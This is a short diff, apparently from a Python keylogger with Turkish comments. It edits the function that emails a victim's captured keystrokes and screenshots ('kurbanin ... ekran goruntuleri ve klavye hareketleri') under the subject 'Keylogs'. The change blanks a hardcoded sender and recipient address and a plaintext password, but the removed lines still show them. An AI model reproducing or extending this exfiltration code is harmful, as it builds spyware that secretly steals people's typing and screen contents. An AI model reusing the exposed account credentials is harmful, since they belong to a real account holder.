@@ -24,13 +24,13 @@ def mail_at():
     dosyam["Subject"] = "Keylogs"
     
 #gmailin kimden gidiceğini belirtiniz
-    dosyam["From"] = "sems.yapar@yandex.com"
+    dosyam["From"] = ""
 
 #gmailin kime gideceğini belirtiniz
-    dosyam["To"] = "sems.yapar@yandex.com"
+    dosyam["To"] = ""
     
 #gmail şifresi
-    password = "za12345ZA"  
+    password = ""  
     
     dosyam.set_content(f"kurbanin {count} ekran goruntuleri ve klavye hareketleri..\n\n{data}")
 
